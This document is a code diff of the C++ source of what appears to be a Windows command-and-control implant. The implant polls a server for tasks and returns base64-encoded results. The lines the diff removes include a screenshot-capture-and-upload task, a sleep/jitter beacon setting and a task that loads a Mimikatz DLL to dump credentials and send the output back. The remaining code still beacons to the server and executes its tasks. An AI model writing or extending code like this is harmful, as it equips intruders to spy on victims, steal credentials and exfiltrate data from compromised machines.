-		if (!hScreenshot) {
-			result.status = 5;
-			result.output = "Failed to load screenshot module from path: ";
-			result.output += dllPath;
-			break;
-		}
-
-		// Exported function signature: int ExecuteW(char** output, int* size);
-		typedef int(*pExecuteW)(char**, int*);
-		pExecuteW ScreenshotFunc = (pExecuteW)GetProcAddress(hScreenshot, "ExecuteW");
-		if (!ScreenshotFunc) {
-			result.status = 5;
-			result.output = "Failed to locate ExecuteW in screenshot module.";
-			FreeLibrary(hScreenshot);
-			break;
-		}
-
-		// Call ExecuteW to get the Base64-encoded screenshot string.
-		char* base64Screenshot = nullptr;
-		int dataSize = 0;
-		int ret = ScreenshotFunc(&base64Screenshot, &dataSize);
-
-		if (ret != 0 || base64Screenshot == nullptr || dataSize <= 0) {
-			FreeLibrary(hScreenshot);
-			result.status = 5;
-			result.output = "Screenshot function failed.";
-			break;
-		}
-
-		// Construct a std::string from the returned buffer.
-		std::string b64Screenshot(base64Screenshot, dataSize);
-		PRINTF("[DEBUG] Base64 Screenshot (first 50 chars): %.50s\n", b64Screenshot.c_str());
-
-		typedef void(*pFreeScreenshotMem)(void*);
-		pFreeScreenshotMem pFreeMem = (pFreeScreenshotMem)GetProcAddress(hScreenshot, "FreeScreenshotMemory");
-		if (pFreeMem) {
-			pFreeMem(base64Screenshot);  // Freed via DLL function
-		}
-		FreeLibrary(hScreenshot);
-
-		// Decode the Base64 string to obtain binary PNG data.
-		std::string pngData = base64_decode(b64Screenshot);
-		if (pngData.empty()) {
-			result.status = 5;
-			result.output = "Failed to decode screenshot data.";
-			break;
-		}
-
-		// Write the PNG data to a temporary file.
-		std::string taskId = task["id"].get<std::string>();
-		std::string tempFilePath = "temp_screenshot_" + taskId + ".png";
-		FILE* fp = fopen(tempFilePath.c_str(), "wb");
-		if (!fp) {
-			result.status = 5;
-			result.output = "Failed to open temporary file for screenshot upload.";
-			break;
-		}
-		size_t written = fwrite(pngData.data(), 1, pngData.size(), fp);
-		fclose(fp);
-
-		if (written != pngData.size()) {
-			result.status = 5;
-			result.output = "Error writing complete screenshot data to temporary file.";
-			break;
-		}
-
-		// Debug the file size and contents
-		FILE* checkFp = fopen(tempFilePath.c_str(), "rb");
-		if (checkFp) {
-			fseek(checkFp, 0, SEEK_END);
-			long fileSize = ftell(checkFp);
-			fclose(checkFp);
-			PRINTF("[DEBUG] Written screenshot file size: %ld bytes\n", fileSize);
-		}
-
-		// Use the UploadFile helper function to upload the screenshot
-		std::string outputMessage;
-		bool success = UploadFile(taskId, tempFilePath, outputMessage);
-
-		// Regardless of upload result, try to delete the temporary file
-		remove(tempFilePath.c_str());
-
-		result.status = success ? 4 : 5;
-		result.output = outputMessage;
-		break;
-	}
-	//hi
-
-
-	case 15: 
-	{ // Sleep/Jitter Task
-	// Expected input format: "sleep_time jitter_max [jitter_min]"
-		std::istringstream iss(input);
-		int newSleepTime, newJitterMax, newJitterMin = 25; // default jitter_min
-		if (!(iss >> newSleepTime >> newJitterMax)) {
-			result.status = 5;
-			result.output = "Invalid parameters for sleep command.";
-			break;
-		}
-		if (!(iss >> newJitterMin)) {
-			newJitterMin = 25; // use default if not provided
-		}
-		if (newJitterMax < newJitterMin) {
-			newJitterMin = 0; 
-		}
-		// Update global values
-		globalSleepTime = newSleepTime;
-		globalJitterMax = newJitterMax;
-		globalJitterMin = newJitterMin;
-
-		std::ostringstream oss;
-		oss << "Sleep configuration updated: " << newSleepTime << " seconds, jitter_max: "
-			<< newJitterMax << "%, jitter_min: " << newJitterMin << "%";
-		result.status = 4;
-		result.output = oss.str();
-		break;
-	}
-
-	case 16: { // Mimikatz Task
-	// Expect a semicolon-delimited argument string
-		std::string args = input;
-		if (args.empty()) {
-			result.status = 5;
-			result.output = "Usage: mimikatz \"mod::cmd1;mod::cmd2;...\"";
-			break;
-		}
-
-		// Create pipes to capture standard output
-		HANDLE hReadPipe, hWritePipe;
-		SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
-
-		if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
-			result.status = 5;
-			result.output = "Failed to create pipes for output redirection";
-			break;
-		}
-
-		// Save the current stdout handle
-		HANDLE hOldStdout = GetStdHandle(STD_OUTPUT_HANDLE);
-
-		// Set stdout to our pipe
-		if (!SetStdHandle(STD_OUTPUT_HANDLE, hWritePipe)) {
-			CloseHandle(hReadPipe);
-			CloseHandle(hWritePipe);
-			result.status = 5;
-			result.output = "Failed to redirect stdout";
-			break;
-		}
-
-		// Load the Mimikatz DLL
-		const char* dllPath = "modules\\mimikatz_x64.dll";
-		HMODULE hDll = LoadLibraryA(dllPath);
-		if (!hDll) {
-			// Restore stdout
-			SetStdHandle(STD_OUTPUT_HANDLE, hOldStdout);
-			CloseHandle(hReadPipe);
-			CloseHandle(hWritePipe);
-
-			result.status = 5;
-			result.output = std::string("Failed to load DLL: ") + dllPath;
-			PRINTF("[DEBUG] LoadLibrary failed with error: %d\n", GetLastError());
-			break;
-		}
-
-		// Try to get the exports with different naming conventions
-		PRINTF("[DEBUG] Looking for exported functions in mimikatz DLL\n");
-
-		// Get the ExecuteW function
-		typedef LPWSTR(*ExecuteWFunc)(LPWSTR);
-		ExecuteWFunc ExecuteW = (ExecuteWFunc)GetProcAddress(hDll, "ExecuteW");
-
-		// If ExecuteW is not found, try alternatives
-		if (!ExecuteW) {
-			PRINTF("[DEBUG] ExecuteW not found, error: %d\n", GetLastError());
-			ExecuteW = (ExecuteWFunc)GetProcAddress(hDll, "_ExecuteW");
-
-			if (!ExecuteW) {
-				PRINTF("[DEBUG] _ExecuteW not found, trying Invoke\n");
-				ExecuteW = (ExecuteWFunc)GetProcAddress(hDll, "Invoke");
-
-				if (!ExecuteW) {
-					// Restore stdout
-					SetStdHandle(STD_OUTPUT_HANDLE, hOldStdout);
-					CloseHandle(hReadPipe);
-					CloseHandle(hWritePipe);
-					FreeLibrary(hDll);
-
-					result.status = 5;
-					result.output = "Failed to locate any expected function in mimikatz module.";
-					break;
-				}
-			}
-		}
-
-		// Get optional Init/Cleanup functions
-		typedef void (WINAPI *InitFunc)();
-		typedef void (WINAPI *CleanupFunc)();
-		InitFunc Init = (InitFunc)GetProcAddress(hDll, "Init");
-		CleanupFunc Cleanup = (CleanupFunc)GetProcAddress(hDll, "Cleanup");
-
-		// Initialize if the function exists
-		if (Init) {
-			PRINTF("[DEBUG] Calling Init function\n");
-			Init();
-		}
-
-		// Convert UTF-8 args to wide
-		int wlen = MultiByteToWideChar(CP_UTF8, 0, args.c_str(), -1, NULL, 0);
-		std::wstring wArgs(wlen, 0);
-		MultiByteToWideChar(CP_UTF8, 0, args.c_str(), -1, &wArgs[0], wlen);
-
-		// Execute the mimikatz commands
-		PRINTF("[DEBUG] Calling the mimikatz function with args: %s\n", args.c_str());
-		LPWSTR wOut = ExecuteW(const_cast<LPWSTR>(wArgs.c_str()));
-
-		// Call cleanup if available
-		if (Cleanup) {
-			PRINTF("[DEBUG] Calling Cleanup function\n");
-			Cleanup();
-		}
-
-		// Close the write end of the pipe so ReadFile will complete
-		CloseHandle(hWritePipe);
-
-		// Read the captured output
-		std::string capturedOutput;
-		char buffer[4096];
-		DWORD bytesRead;
-
-		while (ReadFile(hReadPipe, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
-			buffer[bytesRead] = '\0';
-			capturedOutput += buffer;
-		}
-
-		// Restore the original stdout
-		SetStdHandle(STD_OUTPUT_HANDLE, hOldStdout);
-		CloseHandle(hReadPipe);
-
-		// Even if wOut is NULL, we may have captured output
-		if (!capturedOutput.empty()) {
-			result.status = 4; // Success
-			result.output = capturedOutput;
-			PRINTF("[DEBUG] Captured mimikatz output: %.100s\n", capturedOutput.c_str());
-		}
-		else if (wOut) {
-			// If we have a return value but no captured output, convert it
-			int outLen = WideCharToMultiByte(CP_UTF8, 0, wOut, -1, NULL, 0, NULL, NULL);
-			std::string outBuf(outLen, 0);
-			WideCharToMultiByte(CP_UTF8, 0, wOut, -1, &outBuf[0], outLen, NULL, NULL);
-
-			result.status = 4; // Success
-			result.output = outBuf;
-			PRINTF("[DEBUG] Mimikatz function output: %.100s\n", outBuf.c_str());
-
-			delete[] wOut;
-		}
-		else {
-			PRINTF("[DEBUG] No output captured from mimikatz\n");
-			result.status = 5; // Failure
-			result.output = "Mimikatz execution failed - no output captured.";
-		}
-
-		FreeLibrary(hDll);
-		break;
-	}
-
-
 
 	default:
 		result.status = 7;
@@ -1510,39 +1051,29 @@ TaskResult ExecuteTask(const json &task) {
 	return result;
 }
 
-int addJitter(int sleepTime, int jitterPercentage)
-{
-	// Calculate the maximum jitter value as a percentage of the sleep time
-	int jitter = (sleepTime * jitterPercentage) / 100;
-	// Generate a random jitter between 0 and jitter (inclusive)
-	int randomJitter = rand() % (jitter + 1);
-	// Return the sleep time increased by the random jitter
-	return sleepTime + randomJitter;
-}
-
 void SendTaskResponse(const json &task, const TaskResult &tr) {
-	// First, create the response data
 	json responseData = {
 		{"id", task["id"]},
 		{"agent_id", agent_id},
 		{"result", base64_encode(tr.output)},
 		{"status", tr.status}
 	};
-
-	// Base64 encode the response data
-	std::string encoded_data = base64_encode(responseData.dump());
-
-	// Create the outer request with ht=3 for TaskResult
+	std::string encodedData = base64_encode(responseData.dump());
 	json payload = {
-		{"data", encoded_data},
-		{"ht", 3}  // requesttype.TaskResult.value
+		{"ht", 3},
+		{"data", encodedData}
 	};
+	std::string encodedPayload = base64_encode(payload.dump());
+	json finalRequest = { {"d", encodedPayload} };
+	std::string requestBody = finalRequest.dump();
 
 	PRINTF("[DEBUG] Response Data (Before Base64 Encoding): %s\n", responseData.dump().c_str());
+	PRINTF("[DEBUG] Encoded Data: %s\n", encodedData.c_str());
+	PRINTF("[DEBUG] Final Payload: %s\n", requestBody.c_str());
 
-	// Since we don't need the response, use the fire-and-forget version
-	if (postEncryptedFireAndForget(payload)) {
-		PRINTF("[DEBUG] Task result sent successfully\n");
+	std::string response;
+	if (sendHttpPost(requestBody, response)) {
+		PRINTF("[DEBUG] Task result sent. Server response: %s\n", response.c_str());
 	}
 	else {
 		CERR("[ERROR] Failed to send task response\n");
@@ -1550,42 +1081,30 @@ void SendTaskResponse(const json &task, const TaskResult &tr) {
 }
 
 void PollForTasks() {
-	// Create the data structure the server expects
-	json agentData = { {"agent_id", agent_id} };
-
-	// Base64 encode the agent data
-	std::string encoded_data = base64_encode(agentData.dump());
-
-	// Create the outer JSON structure with ht=2 for GetNextTask
-	json requestData = {
+	json requestData = { {"agent_id", agent_id} };
+	std::string encoded_data = base64_encode(requestData.dump());
+	json request_data = {
 		{"data", encoded_data},
-		{"ht", 2}  // requesttype.GetNextTask.value
+		{"ht", 2}
 	};
-
-	json task;
-	if (sendEncryptedRequest(requestData, task)) {
-		// Check if the response is an error message
-		if (task.contains("message") && task["message"] == "error") {
-			PRINTF("[DEBUG] Received error response from server\n");
-			return; // Skip processing if we got an error
-		}
-
-		// Check if the task is empty (no task available)
-		if (task.empty() || (task.size() == 1 && task.contains("message"))) {
-			if (VERBOSE) {
-				PRINTF("[DEBUG] No task available.\n");
+	std::string encoded_request = base64_encode(request_data.dump());
+	json final_payload = { {"d", encoded_request} };
+	std::string requestBody = final_payload.dump();
+	std::string response;
+	if (sendHttpPost(requestBody, response)) {
+		json responseJson = json::parse(response);
+		if (responseJson.contains("data")) {
+			std::string decodedResponse = base64_decode(responseJson["data"].get<std::string>());
+			json task = json::parse(decodedResponse);
+			if (!task.empty()) {
+				PRINTF("[DEBUG] Task received: %s\n", task.dump().c_str());
+				TaskResult tr = ExecuteTask(task);
+				SendTaskResponse(task, tr);
 			}
-			return;
-		}
-
-		// Only process if we have a valid task
-		if (task.contains("type") && task.contains("id")) {
-			PRINTF("[DEBUG] Task received: %s\n", task.dump().c_str());
-			TaskResult tr = ExecuteTask(task);
-			SendTaskResponse(task, tr);
-		}
-		else {
-			PRINTF("[DEBUG] Received invalid task format: %s\n", task.dump().c_str());
+			else {
+				if (VERBOSE)
+					PRINTF("[DEBUG] No task available.\n");
+			}
 		}
 	}
 }
@@ -1598,7 +1117,6 @@ int main(void)
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
 #endif
 {
-	// Your existing main code...
 
 	if (!RegisterWithServer()) {
 		// In release mode, don't print to console
@@ -1612,8 +1130,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 
 	while (true) {
 		PollForTasks();
-		int sleepTimeWithJitter = addJitter(globalSleepTime, globalJitterMax);
-		Sleep(sleepTimeWithJitter * 1000);
+		Sleep(SLEEP_TIME * 1000);
 	}
 
 	return 0;
